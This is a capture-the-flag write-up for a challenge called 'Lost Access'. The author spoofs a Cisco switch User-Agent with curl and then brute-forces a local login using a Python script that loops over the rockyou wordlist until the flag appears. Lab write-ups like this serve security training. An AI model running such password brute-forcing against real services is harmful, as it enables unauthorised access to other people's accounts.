## Lost Access

## Description
```
Professor Wernig apparently lost access to his beloved `Catalyst 9300X Switch` from Cisco.
The only information he gave us was his username `CCIE`.

Can you obtain his lost access?
```

## Writeup

Starting off, we should take a look at the website. <br/>
```sh
$ curl http://127.0.0.1/
No credentials provided!
```

Seeing this we should try out some different formats to pass credentials. <br/>
```sh
$ curl -d 'username=test&password=test' http://127.0.0.1/
Can only connect from same device-type!
```

Seeing this we should try to add a `User-Agent` to the request. <br/>
The description especially highlights `Catalyst 9300X Switch` which indicates that this device is probably meant. <br/>
```sh
$ curl -X GET -d 'username=test&password=test' http://127.0.0.1/ -H "User-Agent: Catalyst 9300X Switch"
Can only connect from same device-type!
```

This should indicate that it's the wrong `User-Agent`. <br/>
Searching `Catalyst 9300X Switch` in any search-engine should lead to some website from Cisco like [this one](https://www.cisco.com/c/en/us/products/collateral/switches/catalyst-9300-series-switches/nb-06-cat9300-ser-data-sheet-cte-en.html). <br/>
On the websites we find certain abbreviations for the product `Catalyst 9300X Switch` like `C9300X`, `Catalyst 9300X`, `Catalyst 9300`. <br/>
After testing the different abbreviations as `User-Agent` we can get one to work. <br/>
```sh
$ curl -X GET -d 'username=test&password=test' http://127.0.0.1/ -H "User-Agent: C9300X"               
Unknown user!
```

Using the `username` from the description we get a new error. <br/>
```sh
$ curl -X GET -d 'username=CCIE&password=test' http://127.0.0.1/ -H "User-Agent: C9300X"
Wrong password!
```

Passing all checks except the password we are only left with the choice to bruteforce the password as there is no other option left and the description doesn't give any information on the password. <br/>
For this purpose we can write a small python script. <br/>
```py
import requests

base_URL = 'http://127.0.0.1/'

for line in open('/usr/share/wordlists/rockyou.txt', 'r'):

    forms = {
        'username': 'CCIE',
        'password': line.strip()
    }

    headers = {
        'User-Agent': 'C9300X'
    }

    res = requests.get(base_URL, headers=headers, data=forms)

    if res.text != 'Wrong password!':
        print(res.text)
        break
```

Executing the script it takes a while before we get a result. <br/>
```sh
$ python3 try.py 
You shall pass!
Get your Flag here: TH{56b194fa-f370-11ee-9154-4f5ae030831c}
```

Obtaining the flag concludes this writeup.